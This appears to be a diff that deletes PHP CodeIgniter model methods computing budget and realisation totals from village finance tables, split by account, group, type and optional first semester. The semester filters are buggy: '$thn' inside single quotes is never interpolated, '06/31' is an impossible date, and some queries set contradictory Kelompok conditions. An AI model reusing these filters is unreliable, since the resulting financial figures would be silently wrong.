-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_akun_pembiayaan_keluar($akun, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 2) AS Akun, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $akun, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Akun');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function get_subval_pendapatan($id_keuangan_master, $akun, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Nama_Kelompok');
-        $this->db->where('Akun', $akun);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $data = $this->db->get('keuangan_ref_rek2')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']         = $this->pagu_subval_pendapatan($d['Kelompok'], $thn);
-            $data[$i]['realisasi']        = $this->real_subval_pendapatan($d['Kelompok'], $thn, $smt1);
-            $data[$i]['realisasi_bunga']  = $this->real_subval_bunga($d['Kelompok'], $thn, $smt1);
-            $data[$i]['realisasi_jurnal'] = $this->real_subval_jurnal($d['Kelompok'], $thn, $smt1);
-            $data[$i]['sub_pendapatan2']  = $this->sub_pendapatan2($id_keuangan_master, $d['Kelompok'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function get_subval_belanja($id_keuangan_master, $akun, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Nama_Kelompok');
-        $this->db->where('Akun', $akun);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $data = $this->db->get('keuangan_ref_rek2')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']         = $this->pagu_subval_belanja($d['Kelompok'], $thn);
-            $data[$i]['realisasi']        = $this->real_subval_belanja($d['Kelompok'], $thn, $smt1);
-            $data[$i]['realisasi_jurnal'] = $this->real_akun_belanja_jurnal($d['Kelompok'], $thn, $smt1);
-            $data[$i]['realisasi_um']     = $this->real_subval_belanja_um($d['Kelompok'], $thn, $smt1);
-            $data[$i]['realisasi_spj']    = $this->real_subval_belanja_spj($d['Kelompok'], $thn, $smt1);
-            $data[$i]['realisasi_bunga']  = $this->real_subval_belanja_bunga($d['Kelompok'], $thn, $smt1);
-            $data[$i]['sub_belanja2']     = $this->sub_belanja2($id_keuangan_master, $d['Kelompok'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function get_subval_belanja_bidang($id_keuangan_master, $akun, $thn, $smt1 = false)
-    {
-        $this->db->select('Kd_Keg, Nama_Kegiatan');
-        $this->db->like('LEFT(Kd_Keg, 10)', $akun, 'after');
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $this->db->order_by('Kd_Keg');
-        $data = $this->db->get('keuangan_ta_kegiatan')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']         = $this->pagu_subval_belanja_bidang($d['Kd_Keg'], $thn);
-            $data[$i]['realisasi']        = $this->real_subval_belanja_bidang($d['Kd_Keg'], $thn, $smt1);
-            $data[$i]['realisasi_um']     = $this->real_subval_belanja_bidang_um($d['Kd_Keg'], $thn, $smt1);
-            $data[$i]['realisasi_spj']    = $this->real_subval_belanja_spj_bidang($d['Kd_Keg'], $thn, $smt1);
-            $data[$i]['realisasi_bunga']  = $this->real_subval_belanja_bunga_bidang($d['Kd_Keg'], $thn, $smt1);
-            $data[$i]['realisasi_jurnal'] = $this->real_subval_belanja_jurnal($d['Kd_Keg'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function get_subval_pembiayaan($id_keuangan_master, $akun, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Nama_Kelompok');
-        $this->db->where('Akun', $akun);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $this->db->where('Kelompok', '6.1.');
-        $data = $this->db->get('keuangan_ref_rek2')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']        = $this->pagu_subval_pembiayaan($d['Kelompok'], $thn);
-            $data[$i]['realisasi']       = $this->real_subval_pembiayaan($d['Kelompok'], $thn, $smt1);
-            $data[$i]['sub_pembiayaan2'] = $this->sub_pembiayaan2($id_keuangan_master, $d['Kelompok'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function get_subval_pembiayaan_keluar($id_keuangan_master, $akun, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Nama_Kelompok');
-        $this->db->where('Akun', $akun);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $this->db->where('Kelompok', '6.2.');
-        $data = $this->db->get('keuangan_ref_rek2')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']               = $this->pagu_subval_pembiayaan_keluar($d['Kelompok'], $thn);
-            $data[$i]['realisasi']              = $this->real_subval_pembiayaan_keluar($d['Kelompok'], $thn, $smt1);
-            $data[$i]['sub_pembiayaan_keluar2'] = $this->sub_pembiayaan_keluar2($id_keuangan_master, $d['Kelompok'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function pagu_subval_pendapatan($kelompok, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_subval_belanja($kelompok, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_subval_belanja_bidang($kelompok, $thn)
-    {
-        $this->db->select('Kd_Keg AS Kelompok, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Keg', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Kd_Keg');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_subval_pembiayaan($kelompok, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_subval_pembiayaan_keluar($kelompok, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function real_subval_pendapatan($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_tbp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_tbp', 'keuangan_ta_tbp.No_Bukti = keuangan_ta_tbp_rinci.No_Bukti', 'left');
-            $this->db->where('keuangan_ta_tbp.Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_tbp.Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_tbp_rinci')->result_array();
-    }
-
-    private function real_subval_bunga($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_subval_jurnal($kelompok, $thn, $smt1 = false, $kolom = 'Kredit')
-    {
-        $this->db->select("LEFT(Kd_Rincian, 4) AS Kelompok, SUM(keuangan_ta_jurnal_umum_rinci.{$kolom}) AS realisasi");
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_subval_belanja($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        //$this->db->where('keuangan_ta_spp.Jn_SPP', 'LS');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_subval_belanja_um($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_subval_belanja_bidang($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kd_Keg AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Keg', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        //$this->db->where('keuangan_ta_spp.Jn_SPP', 'LS');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_subval_belanja_bidang_um($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kd_Keg AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Keg', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_subval_belanja_spj($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spj_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spj', 'keuangan_ta_spj.No_SPJ = keuangan_ta_spj_rinci.No_SPJ', 'left');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spj_rinci')->result_array();
-    }
-
-    private function real_subval_belanja_spj_bidang($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kd_Keg AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Keg', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spj_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spj', 'keuangan_ta_spj.No_SPJ = keuangan_ta_spj_rinci.No_SPJ', 'left');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spj_rinci')->result_array();
-    }
-
-    private function real_subval_belanja_bunga($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_subval_belanja_bunga_bidang($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kd_Keg AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Keg', $kelompok, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    public function real_subval_belanja_jurnal($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('keuangan_ta_jurnal_umum_rinci.Kd_Keg AS kelompok, SUM(keuangan_ta_jurnal_umum_rinci.Debet) AS realisasi');
-        $this->db->like('keuangan_ta_jurnal_umum_rinci.Kd_Keg', $kelompok, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('kelompok');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_subval_pembiayaan($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(keuangan_ta_jurnal_umum_rinci.Kredit) AS realisasi');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_subval_pembiayaan_keluar($kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 4) AS Kelompok, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $kelompok, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kelompok');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function sub_pendapatan2($id_keuangan_master, $kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Jenis, Nama_Jenis');
-        $this->db->where('Kelompok', $kelompok);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $data = $this->db->get('keuangan_ref_rek3')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']         = $this->pagu_pendapatan2($d['Jenis'], $thn);
-            $data[$i]['realisasi']        = $this->real_pendapatan2($d['Jenis'], $thn, $smt1);
-            $data[$i]['realisasi_bunga']  = $this->real_pendapatan_bunga2($d['Jenis'], $thn, $smt1);
-            $data[$i]['realisasi_jurnal'] = $this->real_pendapatan_jurnal2($d['Jenis'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function sub_belanja2($id_keuangan_master, $kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Jenis, Nama_Jenis');
-        $this->db->where('Kelompok', $kelompok);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $data = $this->db->get('keuangan_ref_rek3')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']         = $this->pagu_belanja2($d['Jenis'], $thn);
-            $data[$i]['realisasi']        = $this->real_belanja2($d['Jenis'], $thn, $smt1);
-            $data[$i]['realisasi_um']     = $this->real_belanja2_um($d['Jenis'], $thn, $smt1);
-            $data[$i]['realisasi_spj']    = $this->real_belanja2_spj($d['Jenis'], $thn, $smt1);
-            $data[$i]['realisasi_bunga']  = $this->real_belanja2_bunga($d['Jenis'], $thn, $smt1);
-            $data[$i]['realisasi_jurnal'] = $this->real_akun_subbelanja_jurnal($d['Jenis'], $thn, $smt1); // cek jurnal
-        }
-
-        return $data;
-    }
-
-    private function sub_pembiayaan2($id_keuangan_master, $kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Jenis, Nama_Jenis');
-        $this->db->where('Kelompok', '6.1.');
-        $this->db->where('Kelompok', $kelompok);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $data = $this->db->get('keuangan_ref_rek3')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']  = $this->pagu_pembiayaan2($d['Jenis'], $thn);
-            $data[$i]['realisasi'] = $this->real_pembiayaan2($d['Jenis'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function sub_pembiayaan_keluar2($id_keuangan_master, $kelompok, $thn, $smt1 = false)
-    {
-        $this->db->select('Kelompok, Jenis, Nama_Jenis');
-        $this->db->where('Kelompok', '6.2.');
-        $this->db->where('Kelompok', $kelompok);
-        $this->db->where('id_keuangan_master', $id_keuangan_master);
-        $data = $this->db->get('keuangan_ref_rek3')->result_array();
-
-        foreach ($data as $i => $d) {
-            $data[$i]['anggaran']  = $this->pagu_pembiayaan_keluar2($d['Jenis'], $thn);
-            $data[$i]['realisasi'] = $this->real_pembiayaan_keluar2($d['Jenis'], $thn, $smt1);
-        }
-
-        return $data;
-    }
-
-    private function pagu_pendapatan2($jenis, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_belanja2($jenis, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_pembiayaan2($jenis, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function pagu_pembiayaan_keluar2($jenis, $thn)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(AnggaranStlhPAK) AS pagu');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('Tahun', $thn);
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_rab_rinci')->result_array();
-    }
-
-    private function real_pendapatan2($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_tbp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_tbp', 'keuangan_ta_tbp.No_Bukti = keuangan_ta_tbp_rinci.No_Bukti', 'left');
-            $this->db->where('keuangan_ta_tbp.Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_tbp.Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_tbp_rinci')->result_array();
-    }
-
-    private function real_pendapatan_bunga2($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_pendapatan_jurnal2($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(keuangan_ta_jurnal_umum_rinci.Kredit) AS realisasi');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kd_Rincian');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_belanja2($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        //$this->db->where('keuangan_ta_spp.Jn_SPP', 'LS');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_belanja2_um($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        $this->db->where('keuangan_ta_spp.Jn_SPP', 'UM');
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function real_belanja2_spj($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->join('keuangan_ta_spj', 'keuangan_ta_spj.No_SPJ = keuangan_ta_spj_rinci.No_SPJ', 'left');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_spj_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spj.Tgl_SPJ <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_spj_rinci')->result_array();
-    }
-
-    private function real_belanja2_bunga($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('Tahun', $thn);
-        if ($smt1) {
-            $this->db->where('Tgl_Bukti >=', '01/01/$thn 00:00:00');
-            $this->db->where('Tgl_Bukti <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_mutasi')->result_array();
-    }
-
-    private function real_pembiayaan2($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(keuangan_ta_jurnal_umum_rinci.Kredit) AS realisasi');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_jurnal_umum_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_jurnal_umum', 'keuangan_ta_jurnal_umum.NoBukti = keuangan_ta_jurnal_umum_rinci.NoBukti', 'left');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_jurnal_umum.Tanggal <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Kd_Rincian');
-
-        return $this->db->get('keuangan_ta_jurnal_umum_rinci')->result_array();
-    }
-
-    private function real_pembiayaan_keluar2($jenis, $thn, $smt1 = false)
-    {
-        $this->db->select('LEFT(Kd_Rincian, 6) AS Jenis, SUM(Nilai) AS realisasi');
-        $this->db->like('Kd_Rincian', $jenis, 'after');
-        $this->db->where('keuangan_ta_spp_rinci.Tahun', $thn);
-        if ($smt1) {
-            $this->db->join('keuangan_ta_spp', 'keuangan_ta_spp.No_SPP = keuangan_ta_spp_rinci.No_SPP', 'left');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP >=', '01/01/$thn 00:00:00');
-            $this->db->where('keuangan_ta_spp.Tgl_SPP <=', '06/31/$thn 00:00:00');
-        }
-        $this->db->group_by('Jenis');
-
-        return $this->db->get('keuangan_ta_spp_rinci')->result_array();
-    }
-
-    private function data_widget_pendapatan($tahun, $opt = false)
-    {
-        if ($opt) {
-            $raw_data       = $this->r_pd_widget($tahun, $opt = true);
-            $res_pendapatan = [];
-            $tmp_pendapatan = [];
-
-            foreach ($raw_data['jenis_pendapatan'] as $r) {
